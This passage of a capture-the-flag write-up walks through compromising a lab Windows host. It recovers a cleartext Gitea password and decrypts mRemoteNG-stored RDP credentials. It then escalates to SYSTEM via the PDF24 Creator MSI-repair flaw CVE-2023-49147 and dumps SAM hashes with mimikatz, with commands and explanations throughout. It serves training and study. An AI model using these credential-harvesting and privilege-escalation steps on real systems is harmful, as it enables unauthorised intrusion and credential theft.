As the gitea instance is running in the context of the user ellen.freeman we are logged in as her (naughty naughty), services should be run as service accounts with long strong passwords.
![](/ox-hugo/2025-09-05-172350_.png)

There is another user `gale.dekarios` on the host too. We can add their name to our list of user names.
![](/ox-hugo/2025-09-05-172439_.png)

+Note+: There is also a `.ssh` folder but as the service is not running and there are no keys contained it's a bust.


#### Discovering Ellen's gitea password. {#discovering-ellen-s-gitea-password-dot}

Looking in Ellen's home directory we can see there is a `.git-credentials` file present.
![](/ox-hugo/2025-09-05-172605_.png)
We can see it contains a clear text password
![](/ox-hugo/2025-09-05-172618_.png)

Let's verify if this is her password in Gitea.
![](/ox-hugo/2025-09-05-172722_.png)
We can see we are signed in as `ellen.freeman`
![](/ox-hugo/2025-09-05-172737_.png)

Checking: pull requests, repositories, mentions as well as personal settings like Security, SSH/GPG Keys, Actions(Secrets &amp; Variables) does not provide any further information and there is no further interesting information here at present.
![](/ox-hugo/2025-09-05-172833_.png)


## 3. Lateral Movement: {#3-dot-lateral-movement}


### Discovering `Gale.Dekarios` Password. {#discovering-gale-dot-dekarios-password-dot}

While checking through Ellen’s `Documents` folder we came across a file named `config.xml`.
![](/ox-hugo/2025-09-05-173256_.png)

Dumping the file with `cat` reveals that it contains what looks like a hashed password:
![](/ox-hugo/2025-09-05-173332_.png)

This file belongs to a program called `mRemoteNG`.


#### Side Quest: What is mRemoteNG? {#side-quest-what-is-mremoteng}

`mRemoteNG` is a tool for managing and connecting to remote systems using protocols such as RDP, VNC, SSH, and more. On this host, we already know that RDP is running on port `3389`.

-   +Official Documentation+: [mRemoteNG Docs](https://mremoteng.org)

By default, `mRemoteNG` stores connection details (including credentials) inside a file called `confCons.xml`.

The typical path for this file is:

```powershell
%USERPROFILE%\APPDATA\Roaming\mRemoteNG
```

On the target system we can indeed locate the `confCons.xml` file:
![](/ox-hugo/2025-09-05-175307_.png)

+Note+: The contents here match the earlier `config.xml` we discovered.
However, it’s important to remember that `mRemoteNG` often creates **backup copies** of this file. These may contain older or alternative credentials, so they’re always worth checking. I have checked these backups and they have no additional interesting information.

Here’s the interesting part: `mRemoteNG` +uses a hardcoded default master password of+ `mR3m` +to encrypt credentials+.  If a user hasn’t set their own master password, all saved credentials can be decrypted from the config file.

<!--list-separator-->

-  Example of stored data:

    **The Master Password Hash is stored in the value of `Protected`**:

    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false"
        EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000"
        FullFileEncryption="false"
        Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo"
        ConfVersion="2.6">
    ..SNIP
    ```

    **Node Connection Information**:

    Each `<Node` element defines connection details for a specific target (RDP, SSH, etc.).

    In the snippet below, we can see a node for the user `Gale.Dekarios` (note: not joined to a domain).

    The password is stored here in encrypted form:

    ```xml
     <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General"
         Id="a179606a-a854-48a6-9baa-491d8eb3bddc"
         Username="Gale.Dekarios" Domain=""
         Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw=="
         Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389"
         ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE"
         ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" />
    ```


### Decrypting Gale.Dekarios's RDP Password: {#decrypting-gale-dot-dekarios-s-rdp-password}

There is a fantastic tool called [mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt?tab=readme-ov-file) which we can use do decrypt the master password.

Clone The Repo :

```bash
git clone https://github.com/gquere/mRemoteNG_password_decrypt.git
cd mRemoteNG_password_decrypt
```

Now we run the tool.

```bash
python3 mremoteng_decrypt.py config.xml
```

And we get a clear text password.
![](/ox-hugo/2025-09-05-182726_.png)


### Accessing the Host Via RDP As Gale: {#accessing-the-host-via-rdp-as-gale}

Now we have the cred's let's see if we can access the host as Gale using the creds

```bash
xfreerdp3 /v:$box /u:$user /p:$pass /drive:/tmp,/home/kali/windowsTools
```

+Note+: We can easily mount a folder using the `/drive:` flag. I like to do this so I can easily access some useful windows tools.

We have access!
![](/ox-hugo/2025-09-06-070434_.png)

Let's get our flag
![](/ox-hugo/2025-09-05-183638_.png)


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Discovering PDF24 Can Be Used For Local Privesc CVE-2023-49147: {#discovering-pdf24-can-be-used-for-local-privesc-cve-2023-49147}

We can see on the desktop there is a program called PDF24.

After a quick search online we can see there is a local privilege escalation vector for this software [sec-consultant article](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

Reading the article there are a few conditions that need to be met for this exploit to be possible.

1.  The software must be either `11.14.0 (pdf24-creator-11.14.0-x64.msi)` or `11.15.1 (pdf24-creator-11.15.1-x64.msi)`
2.  The software must have been installed using the msi installer.
3.  A browser such as Chrome of Firefox must be present.
4.  We will also need the following files:
    -   A copy of the msi installer.
    -   A program called `SetOpLock.exe` available from [Google Project Zero](https://github.com/googleprojectzero/symboliclink-testing-tools)

<!--listend-->

```powershell
get-childitem -Recurse -Path C:\Users\*.msi | select-string -Pattern pdf24 -ErrorAction SilentlyContinue
```


#### 1. Checking PDF24 Creator Version: {#1-dot-checking-pdf24-creator-version}

We can check the version by scrolling to the bottom of the window and selecting `About PDF24 Creator` we can see it's listed as `11.15.1`
![](/ox-hugo/2025-09-06-070936_.png)

As we can see in the article this is a vulnerable version of the application.
![](/ox-hugo/2025-09-06-071005_.png)


#### 2. Checking If PDF24 Creator Was Installed Using MSI: {#2-dot-checking-if-pdf24-creator-was-installed-using-msi}

To check if the program was installed via MSI we can use the following command in PowerShell.

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
              "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" |
  Get-ItemProperty |
  Where-Object { $_.WindowsInstaller -eq 1 } |
  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
```

As we can see from the output/screenshot, it was installed using the MSI installer.
![](/ox-hugo/2025-09-06-073354_.png)

<!--list-separator-->

-  Breaking Down the PowerShell Command to Find MSI-Installed Software:

    Let’s break down the command so it makes sense.

    <!--list-separator-->

    -  Step 1: Enumerate the uninstall registry hives

        We’re querying two registry hive paths that populate “Programs and Features”:

        ```powershell
        # ⟶ native 64-bit apps
        HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

        # ⟶ 32-bit apps on x64
        HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
        ```

        These contain one **subkey per installed application/entry**.

    <!--list-separator-->

    -  Step 2: Read properties from each product key

        `Get-ItemProperty` reads values from each subkey (e.g., `DisplayName`, `DisplayVersion`, `Publisher`, `InstallDate`, and `WindowsInstaller`) and passes them down the pipeline.

        ```powershell
        Get-ItemProperty |
        ```

    <!--list-separator-->

    -  Step 3: Keep only MSI-based installs

        We filter to entries written by **Windows Installer** (MSI) by checking for `WindowsInstaller = 1`.

        ```powershell
        Where-Object { $_.WindowsInstaller -eq 1 } |
        ```

    <!--list-separator-->

    -  Step 4: Trim to useful, readable columns

        Finally, we select the fields we actually care about for quick triage.

        ```powershell
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
        ```

    <!--list-separator-->

    -  Command In Plain English

        “Hey Windows: look at all your installed 32-bit and 64-bit programs, keep only the ones installed via the MSI engine, and show me the Name, Version, Publisher, and Install Date.”

    <!--list-separator-->

    -  Real Output (from the host)

        Below is the actual output from the target host, showing **PDF24 Creator** present and MSI-installed:

        ```text
        DisplayName                                                    DisplayVersion  Publisher                 InstallDate
        -----------                                                    --------------  ---------                 -----------
        Microsoft Visual C++ 2022 X64 Additional Runtime - 14.40.33810 14.40.33810     Microsoft Corporation    20250415
        VMware Tools                                                   12.5.0.24276846 VMware, Inc.             20250415
        PDF24 Creator                                                  11.15.1         geek software GmbH       20231228
        Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.40.33810    14.40.33810     Microsoft Corporation    20250415
        Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.40.33810    14.40.33810     Microsoft Corporation    20250415
        mRemoteNG                                                      1.76.20.24615   Next Generation Software 20231228
        Microsoft Visual C++ 2022 X86 Additional Runtime - 14.40.33810 14.40.33810     Microsoft Corporation    20250415
        ```

        +Note+: `InstallDate` is typically recorded as `YYYYMMDD` (e.g., `20231228`) and may be blank on some entries.

    <!--list-separator-->

    -  Bonus: Grab the MSI ProductCode (GUID) / uninstall string for a target

        If we need the MSI **ProductCode** (often the key name) or uninstall string for PDF24:

        ```powershell

        Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                      "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" |
          Get-ItemProperty |
          Where-Object { $_.WindowsInstaller -eq 1 -and $_.DisplayName -like "*PDF24*" } |
          Select-Object DisplayName, PSChildName, UninstallString
        ```

        -   `PSChildName` ⟶ usually the MSI ProductCode `{GUID}`
        -   `UninstallString` ⟶ the `msiexec` command used to remove/repair


#### 3. Checking If Chrome Or Firefox Is Installed: {#3-dot-checking-if-chrome-or-firefox-is-installed}

We can see on the desktop that Firefox is installed
![](/ox-hugo/2025-09-08-065810_.png)


#### 4. Getting The Relevant Files For CVE-2023-49147: {#4-dot-getting-the-relevant-files-for-cve-2023-49147}

<!--list-separator-->

-  PDF24 Creator MSI Installer:

    We can perform a quick search on the host to find out if the `.msi` file has been left on it.

    ```powershell
    Get-ChildItem -Path C:\ -Filter '*pdf24*.msi' -Recurse -File -Force -ErrorAction SilentlyContinue
    ```

    +Note+: This command will recursively search from the root of the `C:\` drive searching for all all `.msi` files that have the string `pdf24` in them.
    We get a hit and see the installer is stored under `C:\_install` so we have the `.msi` which we need.
    ![](/ox-hugo/2025-09-08-071250_.png)
    You will notice that if we go to the root of `C:\` we cannot see this folder, this means the folder was intentionally hidden by the user, however hidden folders are not excluded from searches as you can see.
    ![](/ox-hugo/2025-09-08-072110_.png)

<!--list-separator-->

-  `SetOpLock.exe`:

    We now just need the `SetOpLock.exe` file which we can get from github. However I am feeling lazy today (and kind of in a rush right now) so let's search for some pre-compliled binaries.

    Luckily `p1sc3s` has uploaded a lovely set of binaries to their github which we can can find [here](https://github.com/p1sc3s/Symlink-Tools-Compiled). We can git clone these &amp; then copy the binary into our shared mounted folder with the host.

    ```bash
    git clone https://github.com/p1sc3s/Symlink-Tools-Compiled
    ```


### Exploiting CVE-2023-49147 For PDF24 Creator Privilege Escalation: {#exploiting-cve-2023-49147-for-pdf24-creator-privilege-escalation}

To run this exploit we will need to have two powershell windows open.

-  First let's set an `oplock` on the file using `SetOpLock.exe`
    ```powershell
       cd  \\tsclient\_tmp\Symlink-Tools-Compiles
       .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
    ```

-  Now let's trigger the repair of the PDF24 Creator msi file.
    ```powershell
       msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
    ```

+Notes+: This part can take a while so be patient.

Ensure you click "OK"
{{< figure src="/ox-hugo/2025-09-08-072841_.png" >}}

Right click on the top bar of the cmd window &amp; click on "properties".

{{< figure src="/ox-hugo/2025-09-08-073117_.png" >}}

Under options click on the "Legacyconsolemode" link

{{< figure src="/ox-hugo/2025-09-08-073326_.png" >}}

Open the link with Firefox.

{{< figure src="/ox-hugo/2025-09-08-073355_.png" >}}

In the opened browser press `Ctrl+o` to open up a file browser &amp; type `cmd.exe` in the top bar and then press ENTER on your keyboard.

{{< figure src="/ox-hugo/2025-09-08-073708_.png" >}}

+Note+: Do not press "Open" just press "ENTER"

We now have a `system shell` !!!
![](/ox-hugo/2025-09-08-073751_.png)

-------

**Here is a quick re-cap of what we just did**.

-   **Stage 1: Privilege** — The repair runs as `SYSTEM`.
-   **Stage 2: Visibility** — A `SYSTEM` process **should be invisible** to the user; however here it **is visible** (console window).
-   **Stage 3: Stall** — We **paused** the `SYSTEM` process at the right time (`oplock` on the log) so the window stays open.
-   **Stage 4: Pivot** — A **help link** inside that `SYSTEM` UI launches the **browser as `SYSTEM`**.
-   **Stage 5: Execute** — From the `SYSTEM` browser, you start **`cmd.exe` as `SYSTEM`**.

-------
**Let's get our flag**.
![](/ox-hugo/2025-09-08-073948_.png)


### <span class="org-todo todo TODO">TODO</span> CVE-2023-49147 — Why the PDF24 MSI “Repair” Leads to SYSTEM (Explained Simply) {#cve-2023-49147-why-the-pdf24-msi-repair-leads-to-system--explained-simply}


#### TL;DR (Plain English) Explanation of CVE-2023-49147 PDF24 Creator Privesc: {#tl-dr--plain-english--explanation-of-cve-2023-49147-pdf24-creator-privesc}

The PDF24 Creator MSI (CVE-2023-49147) can be repaired by a standard user, but its repair routine launches a helper as `SYSTEM` &amp; because of the MSI’s configuration, shows a `visible SYSTEM console` in the user’s desktop. If you **stall** that helper at the moment it writes to a log (via an `oplock`), the console remains open, exposing a `properties → help` link that enables us to launch the default browser as `SYSTEM`. From there, it's possible to use the browsers **Open File** dialog to start `cmd.exe` **SYSTEM shell**.

The underlying flaw is mixing **privileged execution** with **interactive UI**, allowing a non-admin to **pivot** from a visible `SYSTEM` process to a full `SYSTEM` session. The vendor has since shipped a patch to ensure elevated installer actions never present interactively in the UI.

<!--list-separator-->

-  TL;DR One sentence explanation:

    A **privileged, non-impersonating custom action** in the MSI **creates interactive UI** (console + clickable link) in the user’s session, letting a non-admin **bridge** from a `SYSTEM` process to a **`SYSTEM`-owned browser** and then to a **`SYSTEM` shell**.


#### Preconditions (What must be true) To Execute Privilege Escalation Via CVE-2023-49147: {#preconditions--what-must-be-true--to-execute-privilege-escalation-via-cve-2023-49147}

-   PDF24 Creator was installed via `MSI` and per-machine (typical Admin install).
-   PDF24 Version is either of the versions below.
    -   11.14.0
    -   11.15.1
-   You have local GUI access (no admin needed).
-   You trigger an `MSI` repair for PDF24 Creator.
-   The **default browser** is +not+ Edge/IE on Windows 11.
-   **UAC** does not prompt (Windows Installer service performs the privileged work for per-machine maintenance).


#### The Core Mechanism (Why this works) Step By Step: {#the-core-mechanism--why-this-works--step-by-step}

1.  **Windows Installer runs privileged maintenance as SYSTEM.**
    -   For per-machine installs, the **Windows Installer service (msiserver)** executes many repair steps with **LocalSystem** privileges, even when a standard user initiates the repair.
    -   Installer “custom actions” or helper binaries can therefore run **non-impersonated** as `SYSTEM` during repair.

2.  **A SYSTEM process shows an interactive console on your desktop.**
    -   During repair, PDF24’s helper (`pdf24-PrinterInstall.exe`) gets launched as `SYSTEM` and (due to the MSI configuration) spawns a visible console window into the user’s interactive session.
    -   **+Why this is bad+:** `SYSTEM` processes should +not+ present interactive UI on a user’s desktop. Doing so gives the user/attackers ways to pivot that `SYSTEM` context into something useful.

3.  **You keep the `SYSTEM` console alive by stalling a file write.**
    -   The helper writes to a log the log file `faxPrnInst.log` located at `C:\Program Files\PDF24\faxPrnInst.log`
    -   By setting an **opportunistic lock (`oplock`)** on that file right as it’s accessed, the write **blocks**, which keeps the `SYSTEM` console window open instead of closing immediately when the repair finishes.

4.  **From the console’s properties, a `SYSTEM` browser is launched.**
    -   In the console’s title-bar menu, “Properties” exposes a “Legacy console mode” help link.
    -   Clicking that help link launches the **default browser** to a Microsoft help page, but crucially it **inherits `SYSTEM`** from the console process.

5.  **From a `SYSTEM` browser to a `SYSTEM` shell.**
    -   In that `SYSTEM` browser, using the **Open File** dialog (e.g., `Ctrl+O`) and entering `cmd.exe` spawns a **`SYSTEM` command prompt** (the dialog is run by the `SYSTEM` browser, so the child inherits `SYSTEM`).


#### Side Quest: What’s An `oplock`? {#side-quest-what-s-an-oplock}

An opportunistic lock (`oplock`) is a Windows file-system hint that lets a process “get ahead” of other readers/writers by caching or deferring I/O until someone else touches the same file. When another process (here: a `SYSTEM` service/helper during `MSI` repair) tries to access that file, the kernel asks the holder of the `oplock` to break it; i.e. either flush its state or release the handle, before the other I/O can continue. Tools like `SetOpLock.exe` open the exact log file and request an `oplock`; when the privileged helper later tries to write, the kernel issues a break request to the user’s tool, and the write is paused until the break is honored.

That pause is the whole trick. We aren’t “crashing” anything or racing unpredictably **we’re deliberately telling Windows** “hold that privileged write until I say so.” Because the write remains pending, the helper’s workflow doesn’t complete, and the visible `SYSTEM` console it spawned doesn’t exit. That gives us a calm, deterministic window to interact with the console’s `Properties → Legacy` console mode link, which launches the default browser in the same `SYSTEM` context. From there, using the browser’s open file dialog to run `cmd.exe` simply inherits that context.

**Two practical nuances**:

1.  You must target the exact path the helper will touch in, this case `C:\Program Files\PDF24\faxPrnInst.log`, and request the `oplock` before the privileged access occurs. This is why we setup the `oplock` before starting the msi repair.
2.  An `oplock` is not a brute force file lock. Windows is cooperating with us, and the other side will proceed the moment we release/break the lock. That’s why this is reliable: it’s a synchronization primitive, not a flaky race.


#### Side Quest: Why do MSI Repairs Run As `SYSTEM`? {#side-quest-why-do-msi-repairs-run-as-system}

Per-machine MSI installs are owned and orchestrated by the Windows Installer service (`msiserver`), which runs as `LocalSystem`. When a standard user kicks off a repair (e.g. like we did `msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi` the client UI may appear in their session, but the work, file writes, service actions, and any installer `CustomActions` configured to run without impersonation executes inside the service with full `SYSTEM` privileges. **This means +no UAC prompt appears+ because the maintenance is performed by a trusted, already-elevated service on behalf of the user.**

Within MSI semantics, this is expected. Immediate actions tied to UI can impersonate the caller, but deferred, no impersonate actions (or helper binaries spawned by them) intentionally run under the service’s `SYSTEM` token so they can touch protected areas like Program Files, `HKLM`, and driver/print subsystems. In this case, the vendor’s helper (`pdf24-PrinterInstall.exe`) is launched by `msiserver` in that privileged context.

**This is very important**: The vulnerability isn’t that it runs as `SYSTEM`, that’s normal for per-machine maintenance, but that it presents interactive UI (a visible console with a clickable help link) inside the user’s desktop. That UI boundary break is what lets a non-admin bridge from an elevated maintenance flow into an interactive `SYSTEM` session.

Does this mean that all MSI repairs are bad, no, they are not. Just remember an MSI repair has two parts: a user `UI` and a `SYSTEM` service. A repair is safe while the `SYSTEM` side stays headless however the moment it shows a clickable window, that window can become a direct bridge from the user’s desktop to `SYSTEM`.


#### Side Quest: Why the link → Browser Hop Is The Pivot: {#side-quest-why-the-link-browser-hop-is-the-pivot}

When you click Properties → Legacy console mode in the visible `SYSTEM` console, Windows uses the shell (`ShellExecute`) to open a help URL. The shell resolves the default handler for http/https and launches that browser from the same security context as the caller. Because the caller here is a `SYSTEM`-owned console process, the browser initially receives the `SYSTEM` token unless the browser itself implements privilege dropping or a policy prevents this. However, modern browsers immediately apply sandboxing and privilege restrictions, creating a very narrow exploitation window.

<!--list-separator-->

-  Why Edge/IE Usually Won't Give You A Clean `SYSTEM` Path:

    Modern Edge/IE flows make this pivot effectively impossible. Edge (Chromium-based) maintains a multi-process, sandboxed model with a broker that aggressively normalizes to a user-level, medium-integrity context. Even if a stub instance briefly inherits `SYSTEM`, Edge implements Protected Mode and AppContainer isolation that automatically demotes process privileges regardless of the parent token. Internet Explorer (legacy) layers Protected Mode/AppContainer-style isolation with Mandatory Integrity Control, preventing any straightforward privilege escalation path.

    **Two practical gotchas contribute here**:

    1.  Edge's single-instance/hand-off behavior reuses an already-running user instance, so your navigation ends up in the existing user-context browser rather than spawning a new `SYSTEM` process.
    2.  Even when Edge receives an elevated token, its broker architecture and security boundaries ensure all content processes run at restricted integrity levels, completely blocking the attack chain.

<!--list-separator-->

-  Why Chrome/Firefox Have Limited Vulnerability:

    Chrome and Firefox will, when launched fresh by `ShellExecute` and no existing user instance is running, start a browser parent process that simply inherits the caller’s token. If the caller is the `SYSTEM` console, the browser’s parent process is `SYSTEM`. Crucially this means the `Open File` dialog (Ctrl+O) is owned by that parent process, so selecting or typing `C:\Windows\System32\cmd.exe` or `powershell.exe` results in a child process of the browser, which inherits `SYSTEM`. No privilege drop, no broker hand-off to a user instance that’s why the PoC specifically nudges you toward Chrome/Firefox and away from Edge/IE.

    It is worth noting that this is not a sure fire way to achieve privilege escalation as both Chrome &amp; Firefox browsers rapidly apply token lowering and sandboxing mechanisms that severely limit the exploitation window. Meaning the Open File dialog (Ctrl+O) is **NOT** a direct path to `SYSTEM` execution 100% of the time this is because file operations are mediated through browser security policies that normalize privileges. While the parent process may initially have `SYSTEM` privileges, the browser's internal security architecture prevents arbitrary process spawning at elevated privileges. The browsers implement:

    -   Rapid privilege dropping from inherited tokens to restricted lockdown tokens
    -   Process isolation where sandboxed renderers cannot access elevated privileges
    
    Some useful links:
    -   [Sandboxing vs elevated browsing](https://textslashplain.com/2021/01/07/sandboxing-vs-elevated-browsing-as-administrator/)
    -   [Chromium Design Sandbox Docs](https://chromium.googlesource.com/chromium/src/+/main/docs/design/sandbox.md)


## 5. Persistence: {#5-dot-persistence}

Now that we know why this works lets ensure we have persistence.

First things first let's drop into a powershell shell as cmd by default does not support UNC paths for directories which means we cannot access our mounted tools as easily.

```cmd
powershell
```

Now we access our tools

```powershell
cd  \\tsclient\_tmp\
```

We can use mimikatz to dump valuale information. If you have not got mimikatz you can get it [here](https://github.com/gentilkiwi/mimikatz/releases)

We run it

```powershell
.\mimikatz.exe
privilege::debug
```

This will throw the below error as we are not running in the context of the administrator however we can still attack the SAM and extract hashes.

```powershell
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

We then dump the SAM

```powershell
lsadump::sam
```

As you can see we dump the administrator hash
![](/ox-hugo/2025-09-10-075921_.png)

Lets verify this hash is valid, it is.
![](/ox-hugo/2025-09-10-080014_.png)


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1. I learned alot about oplock which was interesting.



### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1. Not too many again which was nice, mainly issues with my own system not the target.



## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

-- Bloodstiller

-- Get in touch bloodstiller at bloodstiller dot com


